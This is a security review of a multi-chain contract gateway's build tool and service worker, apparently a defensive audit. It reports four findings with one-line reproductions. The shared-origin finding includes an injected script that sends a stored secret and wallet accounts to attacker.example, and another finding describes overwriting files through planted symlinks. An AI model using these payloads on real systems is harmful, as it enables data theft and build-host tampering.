# Independent security review

## Execution constraints

I read all 15 scoped files in full and made no changes to the reviewed tree. Network access was not used, as required. The deliberately reduced tree contains no package manifest, installed build dependency, tests, or browser harness, so I could not run the complete esbuild build or browser/service-worker integration tests. I used static analysis and small local Node probes for URL and `Request` behavior; in particular, I confirmed that `parseChains` accepts a URL containing userinfo while the platform `Request` constructor rejects that URL.

## Severity scale

- **Critical:** direct, broadly reachable compromise of users or the build/deployment environment with little or no special precondition.
- **High:** major confidentiality or integrity loss within the gateway origin or its granted permissions, with a realistic configuration/user precondition.
- **Medium:** practical denial of service, secret exposure, or build-host integrity loss that requires a meaningful configuration or local precondition.
- **Low:** limited impact, or impact requiring unusually strong local/deployer control.

## Findings

### F1 — High — Every configured chain can exercise every other chain's origin authority

**Location:** `src/core/target.ts:204`

In the several-chains build, `pinnedTarget` selects the contract using the first path component, but all selected documents are still served by the same origin and service-worker registration. The path prefix is routing, not isolation. Active content returned by any one configured contract can read and overwrite the origin's `localStorage`, IndexedDB, Cache Storage, and other origin state used by every sibling contract; access same-origin windows and fetch sibling-chain resources; unregister the gateway worker; and exercise permissions granted to that origin. In particular, injected wallet providers commonly key authorization by origin, so a contract on a less-trusted chain can see authorized accounts and solicit signatures/transactions in the authority context the visitor associated with another configured chain.

The boot counter makes one concrete cross-chain availability attack easy: a sibling document can unregister the worker and set `sessionStorage["gw44:boot"]` to an invalid or future value. The next sibling-chain load refuses to reinstall the worker and can render only its root inline, leaving its routed subresources unavailable. The stricter counter parser prevents a reload loop, but it cannot provide isolation against a same-origin sibling.

**One-line reproduction:** Build with chain 1 and chain 10 in `GW44_CONFIG`, visit `/1/` and grant the origin wallet access/store `localStorage.secret`, then let chain 10's `html()` return `<script>fetch('https://attacker.example/?s='+encodeURIComponent(localStorage.secret),{mode:'no-cors'});ethereum.request({method:'eth_accounts'}).then(x=>fetch('https://attacker.example/?a='+encodeURIComponent(JSON.stringify(x)),{mode:'no-cors'}))</script>` at `/10/`.

### F2 — Medium — Endpoint count multiplies the timeout without an aggregate deadline

**Location:** `src/adapters/rpc/fetch.ts:85`

Each endpoint receives a fresh 10-second timeout and the endpoints are awaited serially. Neither `createFetchRpc` nor its boot/worker callers impose an overall deadline, while `parseChains` places no count limit on an endpoint list and does not reject duplicates (`tools/chains.ts:41`). Consequently a syntactically valid chains file can turn one navigation into minutes of pending service-worker work. The 16 KiB worker-size check limits the most extreme input only indirectly; dozens or hundreds of repeated short URLs still fit and multiply the timeout. Concurrent navigations compound the retained fetch/stream and worker-event resources.

This is distinct from trusting an endpoint's answer: the endpoint need not return a false result. It only has to accept each request and fail to answer before that attempt's timeout.

**One-line reproduction:** Build chain 1 with the same attacker-controlled HTTPS endpoint repeated 50 times, have it accept every request but send no response, then request any chain-1 resource; the gateway can remain pending for roughly `50 × 10 s` before returning 502.

### F3 — Medium — Credential-bearing RPC URLs are accepted, published, and unusable

**Location:** `tools/chains.ts:50`

Endpoint validation checks only the parsed protocol and hostname. It does not reject `URL.username` or `URL.password`, and it stores the original string rather than a credential-free normalized URL. `tools/build.ts:75` then injects that entire value into both public browser bundles (the worker and the boot script embedded in the page). A deployer who supplies a Basic-auth-style RPC URL therefore publishes the credential to every visitor and static-asset reader.

The URL does not even provide authenticated RPC access: browser Fetch/`Request` rejects an HTTP(S) URL containing embedded credentials before sending it. With only that endpoint, every call becomes a 502; with later endpoints, the leaked credential remains in the deployable and the first entry fails on every call.

**One-line reproduction:** Use `{"1":["https://rpc-user:s3cr3t@rpc.example/v1"]}` as the chains file, build, and inspect `index.html` or `gw44-sw.js`; `s3cr3t` is present in public output while calls through that entry fail at `fetch()`.

### F4 — Medium — Output writes follow attacker-planted symbolic links

**Location:** `tools/build.ts:114`

The pre-write output check compares directory entry names only. It never `lstat`s the three expected entries or rejects an output directory that is itself a symlink. The subsequent `writeFile` calls follow symbolic links, as do the hashing reads. Thus an output directory containing only the three expected names passes the stray-file gate even when one or more names point outside it, and the build truncates and replaces arbitrary files writable by the build user. The post-write name assertion also passes because the directory names did not change.

This matters for reused CI workspaces, restored build caches, or any workflow in which another principal can prepare the output directory but cannot directly write the build user's other files.

**One-line reproduction:** Pre-create `GW44_OUT/index.html` as a symlink to a writable `../victim` and make `404.html` and `gw44-sw.js` ordinary files, then run the build; the stray-name check passes and the generated page overwrites `victim`.

## Required-surface notes (not additional findings)

### Contract selection and redirects

- An unpinned build ships `parseTarget`: host form accepts only a lower-case-normalized 20-byte address in the first hostname label and a canonical decimal chain in the second; path form is considered only on loopback and validates the decoded chain/address. Public-host path forms do not reach contracts.
- A one-contract build ships `pinnedTarget`, ignores the hostname, and maps the entire decoded path to the sole configured contract. A path that resembles another shape is only that contract's resource.
- A several-chains build also ships `pinnedTarget`; the decoded first segment must be an own key of `pins.contracts`. Root redirects to the configured default and an unknown segment throws before an RPC call. Percent-encoding can spell a configured segment but cannot introduce an unconfigured contract.
- All constructed redirects begin with a literal `/`: loopback address canonicalization at `target.ts:103`, default-chain redirect at `target.ts:213`, and chain trailing-slash redirect at `target.ts:222`. Query strings are retained. The boot navigation explicitly appends the fragment; browser HTTP redirects retain a fragment when the destination supplies none. None of these URL-derived values can create a scheme-relative or cross-origin destination.

### Contract-controlled response metadata and inline rendering

- `request()` accepts status 200–599, suppresses bodies for 204/205/304, and defaults to `application/octet-stream`. A contract can deliberately select an active type such as `text/html`, JavaScript, or SVG; those bytes receive the normal browser behavior for that type at the contract's gateway origin. This is the intended content authority and is what makes F1 consequential in a shared-origin build.
- The header allowlist excludes `Set-Cookie`, `Clear-Site-Data`, `Location`, authentication headers, and arbitrary names. Values containing controls other than horizontal tab are dropped. `cache-control: no-store` and `x-content-type-options: nosniff` are always supplied. The passed CSP, framing, opener/embedder, permissions, CORS, disposition, language, and referrer headers can materially change browser behavior, but remain within the content authority already given to that contract.
- The no-worker path writes root `html()` bytes into the live document and therefore executes contract-chosen active HTML at the gateway origin. It does so only top-level, only for a root target, and only when the response has no policy it cannot reproduce; the sole allowed otherwise-unhonourable header is the exact root `frame-ancestors 'self'` policy, for which the top-level check is stricter. No deeper contract path is written inline.

### Worker, loop guard, RPC body handling, and ABI

- The worker intercepts same-origin GET and HEAD requests only when `targetOf` names (or throws while parsing) a target. Cross-origin traffic, non-read methods, and unowned same-origin URLs go to the network/static host. The exact worker pathname is reserved and answered locally with 404 before contract routing.
- A contract document can corrupt the session counter, but malformed and future values fail closed at `MAX_ATTEMPTS`; they suppress worker reload/reinstallation rather than resetting the count or causing the boot script itself to loop. Cross-chain abuse of that shared state is included in F1.
- The RPC reader counts decoded response-stream bytes, cancels after 16 MiB, and applies a 10-second abort signal to each fetch/body read. Endpoints are tried in configuration order. The missing list-wide budget is F2.
- Hostile ABI words are limited to 48-bit safe integers, every word/string access is bounds-checked, the header count is capped at 64, and total referenced key/value bytes are capped before UTF-8 decoding. Body data is a bounded subarray of the already capped RPC result. I found no attacker-selected unbounded allocation, out-of-bounds read, or input-bounded loop beyond those caps.

### Build injection

`parsePin`, `parsePins`, and `parseChains` constrain the values used by esbuild, and `JSON.stringify` makes the `define` substitutions code-safe. `inlineBoot` neutralizes case-insensitive `</script` and `<!--` sequences before inserting the boot bundle into the HTML shell. I found no script-injection path through the pin/config/endpoint strings beyond the credential disclosure in F3. Filesystem output handling is separately affected by F4.
